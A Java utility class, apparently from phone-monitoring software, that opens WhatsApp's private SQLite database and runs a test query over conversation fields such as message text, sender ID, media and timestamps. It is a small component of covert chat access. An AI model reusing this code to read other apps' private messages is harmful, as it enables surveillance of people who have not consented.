package com.vvt.whatsapp;

import java.io.File;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;

import com.vvt.dbobserver.DatabaseHelper;
import com.vvt.im.Customization;
import com.vvt.logger.FxLog;
import com.vvt.whatsapp.WhatsAppObserver.ConversationColumns;

public class WhatsAppUtil {
	
	private static final String TAG = "WhatsAppUtil";
	private static final boolean LOGD = Customization.DEBUG;
	private static final boolean LOGE = Customization.ERROR;
	
	public static boolean TestQuery(){
			
			boolean isWork = false;
			
			File file = new File(WhatsAppObserver.DATABASE_PATH);
			
			if (file.exists()) {
			
				SQLiteDatabase db =  DatabaseHelper.getReadableDatabase(WhatsAppObserver.PACKET_NAME,WhatsAppObserver.REAL_DATABASE_FILE_NAME);
				
				String[] projection = new String[]{
						ConversationColumns.ID,
						ConversationColumns.DATA,
						ConversationColumns.KEY_FROM_ME,
						ConversationColumns.KEY_REMOTE_JID,
						ConversationColumns.MEDIA_SIZE,
						ConversationColumns.MEDIA_TYPE,
						ConversationColumns.RECEIVED_TIME,
						ConversationColumns.REMOTE_RESOURCE,
						ConversationColumns.STATUS};
				String orderBy = "_id DESC";
				
				Cursor cursor = null;
				try{
					cursor = db.query(WhatsAppObserver.DATABASE_TABLE_NAME, projection, null, null, null, null, orderBy,"1");	
					if(cursor != null) {
						isWork = true; 
						if(LOGD) FxLog.d(TAG,"testQuery # this query String is work.");
					}
				} catch (Exception e) {
					if(LOGE) FxLog.e(TAG,"testQuery # this query String is not work.");
					if(LOGE)FxLog.e(TAG,e.toString());
				}
				
				if (db != null) {
					db.close();
				}
				
				if (cursor != null) {
					cursor.close();
				}
			}
			return isWork;
		}
}
